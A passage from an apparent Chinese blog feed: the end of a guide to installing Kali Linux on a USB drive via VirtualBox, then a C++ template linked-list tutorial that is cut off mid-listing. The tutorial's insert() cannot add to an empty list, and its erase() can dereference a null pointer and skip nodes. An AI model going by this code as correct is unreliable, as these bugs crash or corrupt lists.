<p>其中 <strong>/dev/sdb</strong> 对于USB的设备文件名称<br />
这会在当前目录创建一个 <strong>usb.vmdk</strong> 文件</p>
<p>接着启动虚拟机，任意新建一个虚拟电脑，默认下一步，直至创建成功<br />
<img src="/uploads/images/virtual_box/file_003.png" alt="img" /></p>
<p>【设置】-&gt;【存储】底盘为Linux ISO文件，同时添加一个虚拟盘（<strong>使用现有的虚拟盘</strong>），并选择刚才创建好的<strong>usb.vmdk</strong>文件</p>
<p>启动该虚拟机<br />
<img src="/uploads/images/virtual_box/file_004.png" alt="img" /><br />
<img src="/uploads/images/virtual_box/file_005.png" alt="img" /><br />
<img src="/uploads/images/virtual_box/file_006.png" alt="img" /></p>
<p>到了磁盘分区要注意，我们要选择 <strong>sdb</strong>，即要将Linux系统安装到的U盘设备</p>
<p><img src="/uploads/images/virtual_box/file_007.png" alt="img" /><br />
<img src="/uploads/images/virtual_box/file_008.png" alt="img" /></p>
<p>之后就是漫长等待…<br />
<img src="/uploads/images/virtual_box/file_009.png" alt="img" /></p>
<p>安装完成之后，重启虚拟机，同时按 <strong>F11</strong> ，即可进入系统启动项选择。<br />
<img src="/uploads/images/virtual_box/file_010.png" alt="img" /></p>
<h3 id="解决中文乱码"><a class="markdownIt-Anchor" href="#解决中文乱码"></a> 解决中文乱码</h3>
<p>登录之后发现系统显示中文乱码！</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$LANG</span><br>输出 zh_CN.UTF-8<br></code></pre></div></td></tr></table></figure>
<p>先修改更新源，编辑 <strong>/etc/apt/sources.list</strong> 文件，添加以下内容</p>
<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">deb</span> http<span class="hljs-variable">s:</span>//mirrors.ustc.edu.<span class="hljs-keyword">cn</span>/kali kali-rolling main non-free contrib<br><span class="hljs-keyword">deb</span>-src http<span class="hljs-variable">s:</span>//mirrors.ustc.edu.<span class="hljs-keyword">cn</span>/kali kali-rolling main non-free contrib<br></code></pre></div></td></tr></table></figure>
<p>在终端下输入 <code>apt-get upgrade</code> 更新系统</p>
<p>输入 <strong>dpkg-reconfigure locales</strong> 之后选中<strong>en_US.UTF-8</strong>和<strong>zh_CN.UTF-8</strong>，确定后，将<strong>zh_CN.UTF-8</strong>选为默认</p>
<p>安装中文字体</p>
<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">apt-<span class="hljs-built_in">get</span> install xfonts-wqy xfonts-intl-<span class="hljs-built_in">chinese</span><br></code></pre></div></td></tr></table></figure>
<p>重启</p>
<p><img src="/uploads/images/virtual_box/file_011.png" alt="img" /></p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>这样就完成了一个便携式U盘系统了～</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-C++链表实现</title>
    <url>/linkedlist-cpp/</url>
    <content><![CDATA[<p>最近在研究《数据结构、算法与应用C++语言描述》，把一些自己的看法和代码实现写在这里，算是个记录吧，以免以后忘记。</p>
<span id="more"></span>
<h3 id="线性表链表描述"><a class="markdownIt-Anchor" href="#线性表链表描述"></a> 线性表——链表描述</h3>
<p>总所周知，数组中元素地址在内存中是连续分布的，而链表的元素在内存中的存储位置是随机的。其中比较简单的链表类型就是单向链表，这种类型的链表的每个节点只有一个链，且每个节点都连接下一个节点（除了最后一个节点:NULL用来标记链表的结束）。</p>
<p><img src="/uploads/images/data_structure/linkedlist_cpp/node.jpg" alt="" /></p>
<p>为了用链表描述线性表，需要定义一个节点结构体，使用C++模板能够支持更多的类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chainNode</span>&#123;</span><br>    T data;<br>    chainNode* next;<br>    <span class="hljs-built_in">chainNode</span>()&#123;&#125;<br>    <span class="hljs-built_in">chainNode</span>(<span class="hljs-keyword">const</span> T &amp;data)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;data=data;<br>        <span class="hljs-keyword">this</span>-&gt;next=<span class="hljs-literal">nullptr</span>;<br>    &#125;<br>    <span class="hljs-built_in">chainNode</span>(<span class="hljs-keyword">const</span> T &amp;data,chainNode*next)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;data=data;<br>        <span class="hljs-keyword">this</span>-&gt;next=next;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h3 id="链表类linkedlist"><a class="markdownIt-Anchor" href="#链表类linkedlist"></a> 链表类LinkedList</h3>
<p>我们需要定义一个类，用于管理链表操作</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LinkedList</span>&#123;</span><br><span class="hljs-keyword">protected</span>:<br>    chainNode&lt;T&gt;*m_Header;<br>    <span class="hljs-keyword">int</span> m_size;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedList</span>();<br>    <span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> T&amp;);<br>    <span class="hljs-comment">// 拷贝构造函数</span><br>    <span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> LinkedList&lt;T&gt;&amp;);<br>    <span class="hljs-comment">// 移动构造函数</span><br>    <span class="hljs-built_in">LinkedList</span>(LinkedList&lt;T&gt;&amp;&amp;);<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">LinkedList</span>();<br>    <span class="hljs-comment">// 插入节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span>,<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-comment">// 在链表尾插入节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">append</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-comment">// 删除指定索引的节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eraseByIndex</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-comment">// 删除所有元素为T的节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">erase</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-comment">// 删除所有节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearAll</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 返回首次出现的节点索引</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">indexOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-function">T &amp;<span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-function">chainNode&lt;T&gt;*<span class="hljs-title">getFirstchainNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">chainNode&lt;T&gt;*<span class="hljs-title">getLastchainNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 输出所有节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outputLinkedList</span><span class="hljs-params">()</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h3 id="插入节点"><a class="markdownIt-Anchor" href="#插入节点"></a> 插入节点</h3>
<p>链表的插入其实很简单，首先需要找到索引index的节点，然后在<strong>该节点之后或者之前</strong>插入新元素节点，那么？如何插入呢？其实就是通过 <code>chainNode* next</code> 指针将内存中的节点地址链接起来，<code>chainNode* next</code> 也只是一个变量标识符来标识内存中的地址罢了，因此我们可以通过替换next指针将需要插入的节点和已经存在的链表串起来，如下图所示</p>
<p><img src="/uploads/images/data_structure/linkedlist_cpp/insert_node.jpg" alt="" /></p>
<p>为了说明，我们先来一个最简单的例子，在链表尾处插入节点</p>
<h4 id="append"><a class="markdownIt-Anchor" href="#append"></a> append()</h4>
<p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">append</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">while</span> (pNode-&gt;next)&#123;<br>        pNode=pNode-&gt;next;   <br>    &#125;<br>    pNode-&gt;next=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data);<br>    <span class="hljs-keyword">this</span>-&gt;m_size++;<br>&#125;   <br></code></pre></div></td></tr></table></figure>
<p>要在尾部插入节点，那么需要单向遍历整个链表，注意 <code>while (pNode-&gt;next)</code> 不能是 <code>while (pNode)</code> ，因为我们需要用尾节点添加一个新节点，同时更新链表大小</p>
<p>注意：可能有人会有疑惑：pNode=pNode-&gt;next 会让m_Header 指向下一个节点啊？其实 <font color=red>chainNode<T>*pNode=m_Header;  只是将 m_Header 的地址值复制给pNode变量而已，虽然pNode会修改其地址值，但是它内存中的数据对象没有改变，改变的只是一个普通的指针变量</font></p>
<h4 id="insert"><a class="markdownIt-Anchor" href="#insert"></a> insert()</h4>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">insert</span>(<span class="hljs-keyword">int</span> theIndex,<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    <span class="hljs-keyword">if</span>(theIndex&lt;<span class="hljs-number">0</span>||theIndex&gt;=m_size)<span class="hljs-keyword">return</span>;    <br>    <span class="hljs-comment">// 新建头节点</span><br>    <span class="hljs-keyword">if</span>(theIndex==<span class="hljs-number">0</span> &amp;&amp; m_Header==<span class="hljs-literal">nullptr</span>)&#123;<br>        m_Header=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data);<br>        m_size++;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        chainNode&lt;T&gt;*pNode=m_Header;<br>        <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (pNode)&#123;<br>            <span class="hljs-comment">// 在 theIndex之后 插入节点</span><br>            <span class="hljs-comment">// 找到了要插入的索引</span><br>            <span class="hljs-keyword">if</span>(index==theIndex)&#123;<br>                <span class="hljs-comment">// 新节点</span><br>                pNode-&gt;next=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data,pNode-&gt;next);<br>                <span class="hljs-comment">// 该语句等同于: 即替换next指针，使其衔接起来</span><br>                <span class="hljs-comment">// auto p=new chainNode&lt;T&gt;(data);</span><br>                <span class="hljs-comment">// p-&gt;next=pNode-&gt;next;</span><br>                <span class="hljs-comment">// pNode-&gt;next=p;</span><br>                m_size++;<br>            &#125;<br>            index++;<br>            <span class="hljs-comment">// 指向下一个节点</span><br>            pNode=pNode-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="输出链表节点"><a class="markdownIt-Anchor" href="#输出链表节点"></a> 输出链表节点</h3>
<p>在介绍删除之前，我们需要输出链表节点内容方便调试，这段代码很简单，基本都是while(pNode)循环的套路</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">outputLinkedList</span>()&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;m_Header==<span class="hljs-literal">nullptr</span>)<span class="hljs-keyword">return</span>;<br>    chainNode&lt;T&gt;*pNode=<span class="hljs-keyword">this</span>-&gt;m_Header;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;[&quot;</span>&lt;&lt;index&lt;&lt;<span class="hljs-string">&quot;] =&gt; &quot;</span>&lt;&lt;pNode-&gt;data&lt;&lt;std::endl;<br>        index++;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="删除节点"><a class="markdownIt-Anchor" href="#删除节点"></a> 删除节点</h3>
<p>删除链表中的某个节点类似于插入节点，也是通过指针替换的手段，然后delete掉要删除的节点即可。不过有些地方需要注意。<br />
<img src="/uploads/images/data_structure/linkedlist_cpp/delete_node.jpg" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">eraseByIndex</span>(<span class="hljs-keyword">int</span> theIndex)&#123;<br>    <span class="hljs-keyword">if</span>(theIndex&lt;<span class="hljs-number">0</span> || theIndex&gt;=m_size)<span class="hljs-keyword">return</span>;  <br>    <span class="hljs-comment">// deletedNode 为待删除节点</span><br>    chainNode&lt;T&gt;*deletedNode=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 处理删除头节点特殊情况，因为单向链表头结点无前驱节点</span><br>    <span class="hljs-keyword">if</span>(theIndex==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 将 m_Header 标记为删除</span><br>        deletedNode = m_Header;<br>        <span class="hljs-comment">// 更新头节点</span><br>        m_Header=m_Header-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 其他情况</span><br>        chainNode&lt;T&gt;*pNodePre=m_Header;<br>        <span class="hljs-comment">// 查找 待删除节点的前驱节点，其索引为theIndex-1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; theIndex<span class="hljs-number">-1</span>; i++)&#123;<br>            pNodePre=pNodePre-&gt;next;   <br>        &#125;<br>        <span class="hljs-comment">// 指针替换</span><br>        deletedNode=pNodePre-&gt;next;<br>        pNodePre-&gt;next=deletedNode-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">// 删除节点</span><br>    <span class="hljs-keyword">delete</span> deletedNode;<br>    deletedNode=<span class="hljs-literal">nullptr</span>;<br>    m_size--;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>其中要注意如果要删除索引为0的节点也就是头结点，那么只需要让头结点更新为原来的下一个节点，然后再delete要删除的节点，这种情况很特殊，因为<strong>单向链表头结点无前驱节点</strong>。其他情况需要一个前驱节点（也就是当前节点的上一个节点）来衔接整个链表。</p>
<p>再来看下面的代码，删除链表中所有数据为data的节点，同时还处理的头结点的特殊情况</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">erase</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    chainNode&lt;T&gt;*pNodePre;<br>    <span class="hljs-keyword">while</span> (pNode)&#123;<br>        <span class="hljs-keyword">if</span>(pNode-&gt;data==data)&#123;<br>            <span class="hljs-comment">// 处理删除头结点情况</span><br>            <span class="hljs-keyword">if</span>(pNode==m_Header)&#123;<br>                <span class="hljs-keyword">auto</span> next=m_Header-&gt;next;<br>                <span class="hljs-keyword">delete</span> m_Header;<br>                m_Header=next;<br>                <span class="hljs-comment">// 并使其指向原来头结点的下一个节点</span><br>                pNode=next;<br>                m_size--;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                pNodePre-&gt;next=pNode-&gt;next;<br>                <span class="hljs-keyword">delete</span> pNode;<br>                <span class="hljs-comment">// 这条语句能够继续删除链表中数据为data的节点</span><br>                pNode=pNodePre;<br>                m_size--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 保存前驱节点</span><br>        pNodePre=pNode;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="其他成员函数"><a class="markdownIt-Anchor" href="#其他成员函数"></a> 其他成员函数</h3>
<p>事实上，当真正了解的单向链表的插入删除的本质时，其他的链表类型也能理解。</p>
<p>单向链表是最基础的一种链表类型，当然还有其他的一些变种：循环列表、双向链表、双向循环链表、甚至是树结构（层次结构	）也与链表密不可分。因此，必须要对链表十分熟悉！！！</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">bool</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">empty</span>()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;m_Header==<span class="hljs-literal">nullptr</span>&amp;&amp;<span class="hljs-keyword">this</span>-&gt;m_size&lt;=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">int</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">size</span>()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;m_size;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">int</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">indexOf</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode&amp;&amp;pNode-&gt;data!=data)&#123;<br>        index++;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">// 到达链表尾pNode标识为nullptr，表示没有找到</span><br>    <span class="hljs-keyword">if</span>(pNode==<span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> index;    <br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>T &amp;LinkedList&lt;T&gt;::<span class="hljs-built_in">get</span>(<span class="hljs-keyword">int</span> index)&#123;<br>    <span class="hljs-keyword">if</span>(index&lt;<span class="hljs-number">0</span> || index&gt;=m_size)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">length_error</span>(<span class="hljs-string">&quot;the index is invalid!&quot;</span>);<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode&amp;&amp;index!=(count++))&#123;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pNode-&gt;data;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>chainNode&lt;T&gt;* LinkedList&lt;T&gt;::<span class="hljs-built_in">getFirstchainNode</span>()&#123;<br>    <span class="hljs-keyword">return</span> m_Header;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>chainNode&lt;T&gt;* LinkedList&lt;T&gt;::<span class="hljs-built_in">getLastchainNode</span>()&#123;<br>    <span class="hljs-keyword">auto</span> p=m_Header;<br>    <span class="hljs-keyword">while</span> (p&amp;&amp;p-&gt;next)&#123;<br>        p=p-&gt;next;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>完整代码:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 